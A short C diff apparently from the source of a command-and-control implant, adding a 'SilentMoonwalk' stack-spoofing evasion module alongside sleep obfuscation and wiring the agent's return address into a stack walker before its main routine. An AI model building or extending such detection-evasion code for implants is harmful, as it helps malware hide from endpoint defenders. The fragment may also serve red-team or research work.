@@ -3,10 +3,21 @@
 #include "../../headers/TaskController/TaskController.h"
 #include "../../headers/helpers/ListManager.h"
 #include "../../headers/agent/evasion/SleepObfu/SleepObfMain.h"
+#include "../../headers/agent/evasion/StackSpoof/SilentMoonwalk.h"
+
+
+#ifdef _MSC_VER
+// MSVC compiler
+#define GET_ADDRESS_OF_RETURN_ADDRESS() _AddressOfReturnAddress()
+#else
+// Other compilers (e.g., GCC, Clang)
+#define GET_ADDRESS_OF_RETURN_ADDRESS() ((void**)__builtin_frame_address(0)+2)
+#endif
+
 
 pAgent agent = { 0 };
 
-void AgentMain() {
+void AgentMain(PVOID RetAddr) {
 	
 	INT err;
 	Agent Agent = { 0 };
@@ -19,6 +30,9 @@ void AgentMain() {
 	if ((err = RegisterAgent()) != 0) {
 		printf("[error] attempting to register agent\n");
 	}
+
+	agent->Walker->RetAddr = GET_ADDRESS_OF_RETURN_ADDRESS();
+
 
 	AgentRoutine();
 
